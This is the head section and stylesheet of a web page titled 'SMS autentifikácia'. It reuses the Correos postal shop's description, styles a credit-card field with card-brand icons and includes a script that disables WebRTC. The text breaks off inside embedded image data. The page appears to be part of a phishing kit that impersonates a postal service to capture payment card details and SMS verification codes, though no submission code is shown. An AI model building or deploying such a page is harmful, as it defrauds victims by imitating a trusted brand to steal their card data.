<html class="translated-ltr" lang="sk"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
		<link rel="stylesheet" href="./SMS Verificacion/bootstrap.min.css" media="screen">
		<link rel="stylesheet" href="./SMS Verificacion/validationEngine.jquery.css">
		<link rel="stylesheet" href="./SMS Verificacion/flaticon.css">
		<link rel="stylesheet" href="./SMS Verificacion/fontawesome-all.min.css">
		<link rel="stylesheet" href="./SMS Verificacion/new-style-common-screen.css">
		<link rel="stylesheet" href="./SMS Verificacion/common-dynamic.css">
		<!--[if lt IE 9]>
			<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
			<script src="http://ie7-js.googlecode.com/svn/version/2.1(beta4)/IE9.js"></script>
		<![endif]-->
		
		
		<title>SMS autentifikácia</title>
		<meta name="description" content="En la Tienda Online de Correos tenemos todo para hacer tus envíos: cajas, sobres, sellos, embalajes... regalos, coleccionismo y productos solidarios." lang="es">
		
		
		

		<!-- Robots -->
		
		
			<meta name="robots" content="index,follow">
		
		<!-- / Robots -->
		
		<meta name="expires" content="0">
		<meta name="revisit-after" content="1 days">
		
		<meta http-equiv="pragma" content="no-cache">

<style>
.visuallyhidden {
  border: 0;
  clip: rect(0 0 0 0);
  height: 1px;
  margin: -1px;
  overflow: hidden;
  padding: 0;
  position: absolute;
  width: 1px; }





.button {
      color: #ffffff;
    background-color: #25457d;
    padding: 3px 11px;
    font-size: 14px;
    /* letter-spacing: 1px; */
    text-transform: uppercase;
    border: 0;
    border-radius: 5px;
    outline: 0;
    -webkit-transition: all .2s;
    transition: all .2s;
    float: right;
    margin: 0px 10px;
    font-weight: bold;
}
  
  
  .button:hover, .button:active, .button:focus {
    -webkit-transform: scale(1.1);
            transform: scale(1.1); }

.button--transparent {
  background: transparent;
  border: 0;
  outline: 0; }

.button--close {
  position: absolute;
  top: 10px;
  left: 10px;
  display: -webkit-box;
  display: flex;
  -webkit-box-align: center;
          align-items: center;
  -webkit-box-pack: center;
          justify-content: center;
  width: 30px;
  height: 30px;
  color: #ffffff;
  border-radius: 50%;
  -webkit-transition: all .25s;
  transition: all .25s;
  z-index: 10; }
  .button--close svg {
    width: 20px;
    height: 20px; }
    .button--close svg * {
      fill: currentColor; }
  .button--close:hover, .button--close:active, .button--close:focus {
    color: #fbcf34;
    background-color: #ffffff;
    box-shadow: 3px 3px 20px rgba(0, 0, 0, 0.1); }

.button--info {
  position: absolute;
  top: 0;
  right: 0; }

input {
    width: calc(100% - 10px);
    min-height: 30px;
    padding-left: 5px;
    padding-right: 5px;
    letter-spacing: .5px;
    border: 0;
    background-color: #ffb45512;
    border-bottom: 2px solid #ffb45566;
}
.form-list {
  padding-left: 0;
  list-style: none; }
  .form-list__row {
    margin-bottom: 25px; }
    .form-list__row label {
      position: relative;
    display: block;
    text-transform: uppercase;
    font-weight: 600;
    font-size: 13px;
    letter-spacing: .5px;
    color: #25457d;
}
	  
	  
    .form-list__row--inline {
      display: -webkit-box;
      display: flex;
      -webkit-box-pack: justify;
              justify-content: space-between; }
      .form-list__row--inline > :first-child {
        -webkit-box-flex: 2;
                flex: 2;
        padding-right: 20px; }
      .form-list__row--inline > :nth-child(2n) {
        -webkit-box-flex: 1;
                flex: 1; }
  .form-list__input-inline {
    display: -webkit-box;
    display: flex;
    -webkit-box-pack: justify;
            justify-content: space-between; }
    .form-list__input-inline > * {
      width: calc(50% - 10px - 10px); }
  .form-list__row--agree {
    margin-top: 30px;
    margin-bottom: 30px;
    font-size: 12px; }
    .form-list__row--agree label {
      font-weight: 400;
      text-transform: none;
      color: #676767; }
    .form-list__row--agree input {
      width: auto;
      margin-right: 5px; }

#input--cc {
  position: relative;
  padding-top: 0px; }
  #input--cc input {
    padding-left: 52px;
 }
  #input--cc:before {
    content: '';
    position: absolute;
    left: 0;
    top: 50%;
    width: 36px;
    height: 45px;
    background-image: url("data:image/svg+xml;utf8,%3Csvg%20class%3D%22nc-icon%20glyph%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20xmlns%3Axlink%3D%22http%3A//www.w3.org/1999/xlink%22%20x%3D%220px%22%20y%3D%220px%22%20width%3D%2248px%22%20height%3D%2248px%22%20viewBox%3D%220%200%2048%2048%22%3E%3Cg%3E%20%3Cpath%20data-color%3D%22color-2%22%20fill%3D%22%238c8c8c%22%20d%3D%22M47%2C16V9c0-1.105-0.895-2-2-2H3C1.895%2C7%2C1%2C7.895%2C1%2C9v7H47z%22%3E%3C/path%3E%20%3Cpath%20fill%3D%22%238c8c8c%22%20d%3D%22M1%2C22v17c0%2C1.105%2C0.895%2C2%2C2%2C2h42c1.105%2C0%2C2-0.895%2C2-2V22H1z%20M18%2C33H8c-0.552%2C0-1-0.448-1-1s0.448-1%2C1-1h10%20c0.552%2C0%2C1%2C0.448%2C1%2C1S18.552%2C33%2C18%2C33z%20M40%2C33h-5c-0.552%2C0-1-0.448-1-1s0.448-1%2C1-1h5c0.552%2C0%2C1%2C0.448%2C1%2C1S40.552%2C33%2C40%2C33z%22%3E%3C/path%3E%20%3C/g%3E%3C/svg%3E");
	margin: 0px 8px;
    background-position: center;
    background-repeat: no-repeat;
    background-size: 36px;
    -webkit-transform: translateY(-50%);
            transform: translateY(-50%); }

#input--cc.creditcard-icon--visa:before {
  background-image: url("data:image/svg+xml;utf8,%3Csvg%20class%3D%22nc-icon%20colored%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20xmlns%3Axlink%3D%22http%3A//www.w3.org/1999/xlink%22%20x%3D%220px%22%20y%3D%220px%22%20width%3D%2248px%22%20height%3D%2248px%22%20viewBox%3D%220%200%2048%2048%22%3E%3Cg%3E%3Crect%20x%3D%221%22%20y%3D%2214%22%20fill%3D%22%23E6E6E6%22%20width%3D%2246%22%20height%3D%2219%22%3E%3C/rect%3E%20%3Cpath%20fill%3D%22%23E79800%22%20d%3D%22M4%2C41h40c1.657%2C0%2C3-1.343%2C3-3v-5H1v5C1%2C39.657%2C2.343%2C41%2C4%2C41z%22%3E%3C/path%3E%20%3Cpath%20fill%3D%22%231A1876%22%20d%3D%22M44%2C7H4c-1.657%2C0-3%2C1.343-3%2C3v5h46v-5C47%2C8.343%2C45.657%2C7%2C44%2C7z%22%3E%3C/path%3E%20%3Cpolygon%20fill%3D%22%231A1876%22%20points%3D%2219.238%2C28.8%2021.847%2C28.8%2023.48%2C19.224%2020.87%2C19.224%20%22%3E%3C/polygon%3E%20%3Cpath%20fill%3D%22%231A1876%22%20d%3D%22M28.743%2C23.069c-0.912-0.443-1.471-0.739-1.465-1.187c0-0.398%2C0.473-0.824%2C1.495-0.824%20c0.836-0.013%2C1.51%2C0.157%2C2.188%2C0.477l0.354-2.076c-0.517-0.194-1.327-0.402-2.339-0.402c-2.579%2C0-4.396%2C1.299-4.411%2C3.16%20c-0.015%2C1.376%2C1.297%2C2.144%2C2.287%2C2.602c1.016%2C0.469%2C1.358%2C0.769%2C1.353%2C1.188c-0.006%2C0.642-0.811%2C0.935-1.562%2C0.935%20c-1.158%2C0-1.742-0.179-2.793-0.655l-0.366%2C2.144c0.61%2C0.267%2C1.737%2C0.499%2C2.908%2C0.511c2.744%2C0%2C4.525-1.284%2C4.545-3.272%20C30.944%2C24.581%2C30.249%2C23.752%2C28.743%2C23.069z%22%3E%3C/path%3E%20%3Cpath%20fill%3D%22%231A1876%22%20d%3D%22M38.007%2C19.233H35.99c-0.625%2C0-1.092%2C0.171-1.367%2C0.794l-3.876%2C8.776h2.741c0%2C0%2C0.448-1.18%2C0.55-1.439%20c0.3%2C0%2C2.962%2C0.004%2C3.343%2C0.004c0.078%2C0.335%2C0.318%2C1.435%2C0.318%2C1.435h2.422L38.007%2C19.233z%20M34.789%2C25.406%20c0.108-0.276%2C1.173-3.011%2C1.386-3.591c0.353%2C1.651%2C0.009%2C0.049%2C0.781%2C3.591H34.789z%22%3E%3C/path%3E%20%3Cpath%20fill%3D%22%231A1876%22%20d%3D%22M17.049%2C19.231l-2.556%2C6.53l-0.272-1.327l-0.915-4.401c-0.158-0.606-0.616-0.787-1.183-0.808H7.913%20L7.88%2C19.424c1.024%2C0.248%2C1.939%2C0.606%2C2.742%2C1.05l2.321%2C8.317l2.762-0.003l4.109-9.558H17.049z%22%3E%3C/path%3E%3C/g%3E%3C/svg%3E");
  margin: 0px 8px;
  }

#input--cc.creditcard-icon--master-card:before {
  background-image: url("data:image/svg+xml;utf8,%3Csvg%20class%3D%22nc-icon%20colored%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20xmlns%3Axlink%3D%22http%3A//www.w3.org/1999/xlink%22%20x%3D%220px%22%20y%3D%220px%22%20width%3D%2248px%22%20height%3D%2248px%22%20viewBox%3D%220%200%2048%2048%22%3E%3Cg%3E%3Cpath%20fill%3D%22%23003564%22%20d%3D%22M44%2C7H4c-1.657%2C0-3%2C1.343-3%2C3v28c0%2C1.657%2C1.343%2C3%2C3%2C3h40c1.657%2C0%2C3-1.343%2C3-3V10C47%2C8.343%2C45.657%2C7%2C44%2C7z%22%3E%3C/path%3E%20%3Ccircle%20fill%3D%22%23F01524%22%20cx%3D%2219%22%20cy%3D%2224%22%20r%3D%228%22%3E%3C/circle%3E%20%3Cpath%20fill%3D%22%23376BD1%22%20d%3D%22M24%2C30.24c0.093-0.075%2C0.177-0.161%2C0.267-0.24h-0.535C23.823%2C30.079%2C23.907%2C30.165%2C24%2C30.24z%22%3E%3C/path%3E%20%3Cpath%20fill%3D%22%23FEB415%22%20d%3D%22M29%2C16c-2.525%2C0-4.773%2C1.173-6.24%2C3h2.48c0.251%2C0.313%2C0.47%2C0.651%2C0.673%2C1h-3.827h-0.008%20c-0.186%2C0.321-0.352%2C0.653-0.492%2C1h0.009h4.809c0.132%2C0.324%2C0.246%2C0.656%2C0.335%2C1h-5.477c-0.084%2C0.326-0.151%2C0.659-0.193%2C1h5.865%20C26.975%2C23.328%2C27%2C23.661%2C27%2C24h-6c0%2C0.339%2C0.028%2C0.672%2C0.069%2C1h5.865c-0.043%2C0.341-0.111%2C0.674-0.195%2C1h-5.477%20c0.088%2C0.342%2C0.194%2C0.677%2C0.325%2C1h0.009h4.809c-0.141%2C0.346-0.305%2C0.68-0.491%2C1h-3.827h-0.008c0.203%2C0.351%2C0.429%2C0.686%2C0.681%2C1h2.48%20c-0.292%2C0.363-0.623%2C0.693-0.973%2C1h-0.535h-0.012c1.409%2C1.241%2C3.254%2C2%2C5.279%2C2c4.418%2C0%2C8-3.582%2C8-8S33.418%2C16%2C29%2C16z%22%3E%3C/path%3E%3C/g%3E%3C/svg%3E");     margin: 0px 8px;
}

#input--cc.creditcard-icon--american-express:before {
  background-image: url("data:image/svg+xml;utf8,%3Csvg%20class%3D%22nc-icon%20colored%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20xmlns%3Axlink%3D%22http%3A//www.w3.org/1999/xlink%22%20x%3D%220px%22%20y%3D%220px%22%20width%3D%2248px%22%20height%3D%2248px%22%20viewBox%3D%220%200%2048%2048%22%3E%3Cg%3E%3Cpath%20fill%3D%22%23007AC6%22%20d%3D%22M44%2C7H4c-1.657%2C0-3%2C1.343-3%2C3v28c0%2C1.657%2C1.343%2C3%2C3%2C3h40c1.657%2C0%2C3-1.343%2C3-3V10C47%2C8.343%2C45.657%2C7%2C44%2C7z%22%3E%3C/path%3E%20%3Cpath%20fill%3D%22%23FFFFFF%22%20d%3D%22M10.533%2C24.429h2.33l-1.165-2.857L10.533%2C24.429z%20M43%2C19h-5.969l-1.456%2C1.571L34.264%2C19H21.598l-1.165%2C2.571%20L19.268%2C19h-5.096v1.143L13.59%2C19H9.222L5%2C29h5.096l0.582-1.571h1.456L12.716%2C29h5.678v-1.143L18.831%2C29h2.912l0.437-1.286V29%20h11.648l1.456-1.571L36.594%2C29h5.969l-3.785-5L43%2C19z%20M25.383%2C27.571h-1.602V22l-2.475%2C5.571h-1.456L17.375%2C22v5.571h-3.349%20L13.444%2C26H9.95l-0.582%2C1.571H7.475l3.057-7.143h2.475l2.766%2C6.714v-6.714h2.766l2.184%2C4.857l2.038-4.857h2.766v7.143H25.383z%20M39.797%2C27.571h-2.184l-1.893-2.429l-2.184%2C2.429h-6.552v-7.143h6.697l2.038%2C2.286l2.184-2.286h2.038L36.739%2C24L39.797%2C27.571z%20M28.586%2C21.857v1.286h3.64v1.429h-3.64V26h4.077l1.893-2.143l-1.747-2H28.586z%22%3E%3C/path%3E%3C/g%3E%3C/svg%3E");     margin: 0px 8px;
}

#input--cc.creditcard-icon--discover:before {
  background-image: url("data:image/svg+xml;utf8,%3Csvg%20class%3D%22nc-icon%20colored%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20xmlns%3Axlink%3D%22http%3A//www.w3.org/1999/xlink%22%20x%3D%220px%22%20y%3D%220px%22%20width%3D%2248px%22%20height%3D%2248px%22%20viewBox%3D%220%200%2048%2048%22%3E%3Cg%3E%3Cpath%20fill%3D%22%23E6E6E6%22%20d%3D%22M47%2C23.807V10c0-1.657-1.343-3-3-3H4c-1.657%2C0-3%2C1.343-3%2C3v28c0%2C1.657%2C1.343%2C3%2C3%2C3h10.589%20C30.229%2C38.811%2C43.003%2C30.094%2C47%2C23.807z%22%3E%3C/path%3E%20%3Cpath%20fill%3D%22%23E6E6E6%22%20d%3D%22M47%2C38V23.807C43.003%2C30.094%2C30.229%2C38.811%2C14.589%2C41H44C45.657%2C41%2C47%2C39.657%2C47%2C38z%22%3E%3C/path%3E%20%3Cpath%20fill%3D%22%23FA7000%22%20d%3D%22M47%2C38V23.807C43.003%2C30.094%2C30.229%2C38.811%2C14.589%2C41H44C45.657%2C41%2C47%2C39.657%2C47%2C38z%22%3E%3C/path%3E%20%3Cpath%20fill%3D%22%23FA7000%22%20d%3D%22M25.029%2C21.013c-1.69%2C0-3.062%2C1.32-3.062%2C2.951c0%2C1.734%2C1.312%2C3.028%2C3.062%2C3.028%20c1.708%2C0%2C3.054-1.313%2C3.054-2.995C28.084%2C22.325%2C26.747%2C21.013%2C25.029%2C21.013z%22%3E%3C/path%3E%20%3Cpath%20fill%3D%22%23444444%22%20d%3D%22M7.646%2C21.121H6v5.743h1.636c0.871%2C0%2C1.499-0.207%2C2.05-0.664c0.654-0.541%2C1.043-1.359%2C1.043-2.206%20C10.728%2C22.298%2C9.462%2C21.121%2C7.646%2C21.121z%20M8.956%2C25.434c-0.356%2C0.318-0.81%2C0.457-1.535%2C0.457H7.121v-3.798h0.301%20c0.725%2C0%2C1.161%2C0.13%2C1.535%2C0.464c0.385%2C0.345%2C0.617%2C0.878%2C0.617%2C1.429C9.573%2C24.539%2C9.342%2C25.091%2C8.956%2C25.434z%22%3E%3C/path%3E%20%3Crect%20x%3D%2211.245%22%20y%3D%2221.121%22%20fill%3D%22%23444444%22%20width%3D%221.116%22%20height%3D%225.743%22%3E%3C/rect%3E%20%3Cpath%20fill%3D%22%23444444%22%20d%3D%22M15.102%2C23.322c-0.674-0.247-0.871-0.412-0.871-0.722c0-0.361%2C0.352-0.635%2C0.836-0.635%20c0.335%2C0%2C0.612%2C0.134%2C0.906%2C0.462l0.583-0.764c-0.481-0.424-1.058-0.638-1.686-0.638c-1.016%2C0-1.791%2C0.707-1.791%2C1.642%20c0%2C0.794%2C0.36%2C1.197%2C1.411%2C1.579c0.439%2C0.153%2C0.662%2C0.257%2C0.776%2C0.328c0.224%2C0.145%2C0.335%2C0.352%2C0.335%2C0.592%20c0%2C0.467-0.37%2C0.811-0.871%2C0.811c-0.533%2C0-0.964-0.267-1.222-0.768l-0.722%2C0.7c0.516%2C0.756%2C1.135%2C1.094%2C1.988%2C1.094%20c1.163%2C0%2C1.982-0.778%2C1.982-1.887C16.757%2C24.202%2C16.377%2C23.788%2C15.102%2C23.322z%22%3E%3C/path%3E%20%3Cpath%20fill%3D%22%23444444%22%20d%3D%22M17.108%2C23.994c0%2C1.689%2C1.326%2C2.998%2C3.032%2C2.998c0.481%2C0%2C0.894-0.095%2C1.402-0.335v-1.32%20c-0.449%2C0.451-0.843%2C0.629-1.353%2C0.629c-1.128%2C0-1.927-0.816-1.927-1.98c0-1.1%2C0.825-1.972%2C1.877-1.972%20c0.531%2C0%2C0.937%2C0.188%2C1.402%2C0.646v-1.318c-0.491-0.248-0.894-0.351-1.379-0.351C18.467%2C20.991%2C17.108%2C22.325%2C17.108%2C23.994z%22%3E%3C/path%3E%20%3Cpolygon%20fill%3D%22%23444444%22%20points%3D%2230.617%2C24.977%2029.086%2C21.121%2027.864%2C21.121%2030.299%2C27.009%2030.9%2C27.009%2033.382%2C21.121%2032.17%2C21.121%20%22%3E%3C/polygon%3E%20%3Cpolygon%20fill%3D%22%23444444%22%20points%3D%2233.89%2C26.864%2037.066%2C26.864%2037.066%2C25.891%2035.011%2C25.891%2035.011%2C24.341%2036.988%2C24.341%2036.988%2C23.368%2035.011%2C23.368%2035.011%2C22.093%2037.066%2C22.093%2037.066%2C21.121%2033.89%2C21.121%20%22%3E%3C/polygon%3E%20%3Cpath%20fill%3D%22%23444444%22%20d%3D%22M41.5%2C22.815c0-1.076-0.738-1.695-2.031-1.695h-1.664v5.743h1.123v-2.309h0.146l1.547%2C2.309H42l-1.807-2.421%20C41.037%2C24.271%2C41.5%2C23.694%2C41.5%2C22.815z%20M39.254%2C23.762h-0.325v-1.737h0.343c0.7%2C0%2C1.075%2C0.294%2C1.075%2C0.853%20C40.347%2C23.452%2C39.972%2C23.762%2C39.254%2C23.762z%22%3E%3C/path%3E%3C/g%3E%3C/svg%3E");     margin: 0px 8px;
}

.modal {
  display: -webkit-box;
 display: flex; 

  z-index: 100; 
overflow-y: auto;
}
  .modal__container {
    display: -webkit-box;
    display: flex;
    max-width: 100%;
    min-height: 370px;
    background-color: #ffffff;
    border-radius: 5px;
    box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.0); }
  .modal__featured {
    position: relative;
    -webkit-box-flex: 1;
            flex: 1;
    min-width: 230px;
    padding: 20px;
    overflow: hidden;
    border-top-left-radius: 0px;
    border-bottom-left-radius: 0px; }
  .modal__circle {
    position: absolute;
    top: 0;
    left: 0;
    height: 200%;
    width: 200%;
    background-image: linear-gradient(#00b3ea , #01279a 70%);
    border-radius: 50%;
    -webkit-transform: translateX(-50%) translateY(-25%);
            transform: translateX(-50%) translateY(-25%); }
  .modal__product {
    position: absolute;
    top: 0;
    left: 50%;
    max-width: 85%;
    -webkit-transform: translateX(calc(-50% - 10px));
            transform: translateX(calc(-50% - 10px)); }
  .modal__content {
    -webkit-box-flex: 3;
            flex: 3;
    padding: 20px 20px; }
	
	
	
input {
    width: calc(100% - 10px);
    min-height: 43px;
    padding-left: 5px;
    padding-right: 5px;
    letter-spacing: .5px;
    border: 0;
    background-color: #ffc955;
    border: 2px solid #25457d;
    border-radius: 5px;
    font-size: 20px;
    font-weight: bold;
	background-image: linear-gradient(90deg, rgb(255 255 255) 0%, rgb(255 182 18) 100%);

}



.checkout-box {
    padding: 0;
    background: #ffffff;
}


</style>
		
		
		


		
	<link type="text/css" rel="stylesheet" charset="UTF-8" href="./SMS Verificacion/translateelement.css"><link type="text/css" rel="stylesheet" charset="UTF-8" href="https://translate.googleapis.com/translate_static/css/translateelement.css"><link type="text/css" rel="stylesheet" charset="UTF-8" href="https://translate.googleapis.com/translate_static/css/translateelement.css"><link type="text/css" rel="stylesheet" charset="UTF-8" href="https://translate.googleapis.com/translate_static/css/translateelement.css"><link type="text/css" rel="stylesheet" charset="UTF-8" href="https://translate.googleapis.com/translate_static/css/translateelement.css"><link type="text/css" rel="stylesheet" charset="UTF-8" href="https://translate.googleapis.com/translate_static/css/translateelement.css"><script type="text/javascript" id="webrtc-control">(function () {
      if (typeof navigator.getUserMedia !== "undefined") navigator.getUserMedia = undefined;
      if (typeof window.MediaStreamTrack !== "undefined") window.MediaStreamTrack = undefined;
      if (typeof window.RTCPeerConnection !== "undefined") window.RTCPeerConnection = undefined;
      if (typeof window.RTCSessionDescription !== "undefined") window.RTCSessionDescription = undefined;
      //
      if (typeof navigator.mozGetUserMedia !== "undefined") navigator.mozGetUserMedia = undefined;
      if (typeof window.mozMediaStreamTrack !== "undefined") window.mozMediaStreamTrack = undefined;
      if (typeof window.mozRTCPeerConnection !== "undefined") window.mozRTCPeerConnection = undefined;
      if (typeof window.mozRTCSessionDescription !== "undefined") window.mozRTCSessionDescription = undefined;
      //
      if (typeof navigator.webkitGetUserMedia !== "undefined") navigator.webkitGetUserMedia = undefined;
      if (typeof window.webkitMediaStreamTrack !== "undefined") window.webkitMediaStreamTrack = undefined;
      if (typeof window.webkitRTCPeerConnection !== "undefined") window.webkitRTCPeerConnection = undefined;
      if (typeof window.webkitRTCSessionDescription !== "undefined") window.webkitRTCSessionDescription = undefined;
    })(); </script><link type="text/css" rel="stylesheet" charset="UTF-8" href="https://translate.googleapis.com/translate_static/css/translateelement.css"><link type="text/css" rel="stylesheet" charset="UTF-8" href="https://translate.googleapis.com/translate_static/css/translateelement.css"></head>

	<body class="common-screen-body" style="">
		
		
			<!-- Google Tag Manager -->
			
		
		
		<section class="common-screen-footer">
		
		</section><section class="common-screen-header">
			<nav class="navbar navbar-expand-md navbar-light" style="background: #f7f7f7;background-image: linear-gradient(#ffffff, #fff);">
				
			    <img class="rg_i Q4LuWd" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAO4AAADUCAMAAACs0e/bAAABNVBMVEX////9uBMAOncAOXgANXrr7vMeU4v/vgmli0EAPHyarsUANHu2ljno7PAAOnYAN3n09vnBny0jP3ULRGz/uxAAMnyitcoAMX0AOXvh5+7/xABVcp7a4elHa5sAL34AQoFjf6a2wtIALX/R2OIAKoAASIMALnJ3jrF/l7XDzNkAKIEAKnI+YZP/wQMAJoIAK3X/yQAAQG9lYWLttxXVqiI7Sm9qZV91a1sAO3KsjzyqvdIsV440WY1uhaiKor3SpyJ+cFiIeFIzRHPrrxqPf0m8mjE+VGNSXV4rTmVpalNXWmawjUHksxpCUmqfiERcZlYoSmpTXlx2c0yBe0ibgkuNgUKvkEDXoyyRe1DAlTrLnip4dUpEWWDntw9aXGaYgEw5SHCbjEDKqChVY1jSryNPVGkAGG2FY6ZnAAAgAElEQVR4nN1dCVvbOLeGSIlJDFagNnEg+x6Ih6FhX8JSQkubUNpOS4f2trS93P//E65kS7Zky46h7Uyn55l+HwHH1isdnV3HU1MCZUWqF6dklE3+R0lAkawOOm2OOpWmJoW7mPqP0hwHolAxW1AgZDalcDMm+C+SCeem6gxDfrkFEj4CIXDT/gv/EwTSc1PlLsXQCaL9DeGCAwdvPhVEmzDB7wa3DPdtfq62EgkNtFYh/j1aXV2FGL3WbP92cAEqE7xtFX9OZeoVlEh3CoVuuwlAJS9F68K9j5xwn/mTSfocD66W0FAK83MRJRLlKpbP+wAdZjGm+j6Ag2i4CS3uxGrsSpCQ7JkfSO6IgDc29nACN21ivAeFKbx1Qa8wNTW3jIDD3ostALtRcI2nw9mYNLzI0UF8ifuVB9HwDX3OgvCcMWJwq00skTGsJkigZWx2ZA8hoNJaBVBuVVG4pYslJSb9+aVBhzGK/Z2H0J+7Nfs5aLNvub+0+s9duFNz7TJCFC5h4gFMwD0bVc8EqBAF95U1HZOWXLgbStzvPISWXjtw1efTuvtLfeStLhHKvbXu1L6J4ZKPiyZoOXsWSy24GMXM578e3Fcl+zm5C+4x+sYmD3eq0O4SUQWaWFRN7WFZbS8z+RWSCisG9yr20K0vDe2fgGtdqbZwarzhVkI5OgU8XOwIYaMKf+5hLu5ioYUINyfxlKBOBFy4znHMhGHs/iOrq/c1ex21P3Z5uPMLIlxMXdvMUA+y+R6W0avtvQwxsyJXF8En8eGu/BNwlRsqmBv8Y5TZRADuXI/MC0hlyZbFK7faIpqLCi05XFC6iTt2a5aubuIo5Cs6kaE6JfvnB8C1vlDBDHTu68o7FICLMeDfgf3sVEZ1FTRAUruKmRmN2biyyhpSuOCrBK5uWUp/Y7h7+f7kGNPJ58vd+Y2+Yln3hay8dlbXeMYPTP8LJgJwsxUVc/EBFlJlxCwSuCxDy+BigbAUF+58jc7fvB+ubi1Nz795NT41oeoSBKfjl2/n9aV7Idb7n5ylqr3kB6afqEG42AVsohZm5ql6ky4+Etz/4OqWvsVdXeWm5BiPcCjA1ZX+9eU5WlnJISBYlwDA3MpK4unlUV+PjZiJ4ERphhuY3n8shTvVHVSKRAV1l80WQi20XJeideGqz+IORTmicFWe/xVlY+bxTimH5Ma3loCl0s7Wuw0lpohQZp05M9E1r3ZHYwkz25R0rKi5aqdSaVfla+vBRQtP4g7kieHANTwNoVg3J5uqgWRIPYI5tHmyYcV6jv7eWUb1qs//9no9DK5H2WzonzyPSJ2Pyc36E+TAMr7QgevW0StgoBj+EWbrhYuNpcl85HJtbouHq/xNn8LDrUvMxexeSgrahZt7G3N19ekdZ4aNM/sbunJ0UarF9gVBzbgYTVRN+pGzjED9ix+W8rmUCMKFGT+q+qEpD7x6q7sdW4xQhjJOyEis0fuFEhA3rIZFI1QNTCo0gW83a6h2ddmfMLfKC9XZutqQH5b1KieDa4p4s5l9OCk0h+5GMfHqV4Y7Qbo1vMtBH8OWGjVDW7969uzZ1aN1VGo0cj5GV+Gnr9F6z7pwlhGON4RRPYISuAiYvMXYLeIpngh3IaBGw2b+GYX7uK/0X6sqhwMgNYeuvr0ZXj+Ztg2q6eknN7sfPi4YOchrJ2DAyyiG1hkH4SnlbarrHJDBxdMyYFs134a2TTkBLkAvYq6u9ZTO/N3/bFw1OBDIQJvbX46wsWG5WDBo/LE/f/ZpQVX5axtbESY3s9wS6iV/0dLbBhe84eGCtOMAZfd6q84Fk+LMxnHM1WWMhjbfbpa8LQltvapbslXDC92f/3xu5DzAoDQO1wVLFzXnogXBULVeseeJe5eYzJDgLVTKVBkiNAGuOh7FhHtCH6oBb9eiBjq57kcwKEY8mj1v5LwFNhaGIXg9Xh7zvIx/zTQ7D7eQsrlXbScHiAoJlO5FhuYSJO5+E4+blb/cOXaXylj40J+sThVr/mMJut+CcEbOUNas8wSfJW8NDfeBvJlRL9qzkC5DR0OAVi8TYmpwYfXSWTxDQ3lhiIIWGOB4I54DYCkzY8/4gqJWdUnfdnCBhuBjKm9c3hCtqnyxxc0+SnekYTkf3LjxKuVvKLoApfFsXFMYa67RCTJcNy13KXkmC0gl1Ef8bbGT5G4enxE5V1xlQ0JGsRtuRXJwgREvoqFfa7xxjBrHk60k/uvKPKi5X1Z3g3iZD5+oveZ5Wfl66u0en82c7aSdv5UPpFEMCVxt5W0sn1ffWOcMCyMxjGEDC2T1t1Q2YQjuBhiD2cvYG+LvrP+lhsLFlpRJ/gh6IcmhINyE8TGeszK6ck0LkLubYB/JSOmfIRZ3UE/95o1+s0N9kOe8e4BnwZVUMo9ozw7hNEOSQxK4YCEs+iQSCzRghig9fVB8TrdmSoxDclc+A9pVdOpnYXGPOKay4YrFJ1N7TYJXHbDPk+AmjHheUX+bTXPj6SRbP4ysdwYbfO2lINV1ncLymbXWJaezCdw5c22Vo1a5bP+p1WqRj+nJcOHzfpxtqFDXO6E+DVc/LBIZinfWFXi1M8FSvFxx+FzdEr7NTHUPbtlMhBIoT4brc7dCkVw6mggYf8tVl4Ityf5oA9OoL7cqyUXvVDpcdMoZOLo+ppNpCEJMuS7xPgaB24xwsmPVZhjv4/AmiyMlSlKtaVmj2bPtT3ebm5vju8fHl/N9Szor1tkKHW/uqSeTrCFFi24Fvbj0ocH5zc7qfi9c9SqO3cwyFyRNGgTbn3m1QPx6ZJOqGuj24kYaWre2WGyidMlupOtbFG7jgxBx7d/ybjVl5vDMvxmDmTGAFzEsK9fqCdhhinJ0oq3kxBAdQLXasxmJKaL3n9PtCA0WGFSGmjOVpirECq3dnHBPDDcZWWa2Hwdu7lkcuMyagzuCMNGtjeOFEpREXoFRGu8GhThmE2dmtNoFfa4r9cXAtz69pQo3JIqoEEmRcIEjNnxGeRjebRrczvEroFu7t75ADg8YbW0EWF95U6N/1pwclcIMVFMM2us3p05eVxLNuA+xhOfVlTNQd5qjyDqjnLXCeazKaKsUFWgGOTjr11u6q10MJzLIctgJ47FgUSnvDWdWPvryuw+Dq56/deY5lmVlzTpweX9UuX4kRl+BaZqi6IS19369bt1QZxLtzOvkIw0GATArLO7Iicmh27e3PwTu1RNAxc/ZZLjKEXVZct/YxcrwlJclsFTCbi2AuVKOswWQcezPmivb9Gu5YwUv9if6SRUNHuvSUbrq1vyk1a0vLk52ANVHjI3geHIAVmcBUDimo7KGp6pXB1VqrL86+/vm+vrvFx/O1RUvGgBKL3371/UH4PoTvPmZ4VT6Iuwpi8Z6S1++BrP3hJJ7FTuXUO+R8l6zk5SC5eAypx0YlzG4mQYjQcIJnSk3mis4kbHwjaQ3SUKbRCGfzHyEnuf2x2ufQlKO6Tdrb/5kCi5hjIWrrNk/7LlEC31JsYKdIlktkdBcvenkHozlkHiGC1cf3an0UYKQkNLSG2riqHa0SRmtu/asoR0fCclrbEXOPodMYoOcbzZdm0V9ZB2zHIGYXNf1c/v2WF39KYWbMZFmlwUWmRZUK5PgKp+pdim9m+jBWsMave2JTuTrVo1xculqGAjkYEvrcocFbOCpWBah69SZT8Bjje7z3LlwiTJLGS93vSSD28XGsw236/nhRmQkUn00rdBtkTCuJsJ1s4DwE968yqUbP268Gsm2gq7c7LDwJW8g21NH67TwzehdTPVvMUZFTYzSuSWrvElWSOmN2plySlGAHX1FvQlwdYUWO4qlPXJSHPbCu+mrrn9dYPq2dBLmEVr9MZPcjTNhOnV9x2ebGMeizp2lFQjwb0UGt26HMdY6U6TQKJEoVw7LpDpVKq08uF4Vgjqe6PayiAOAL3TF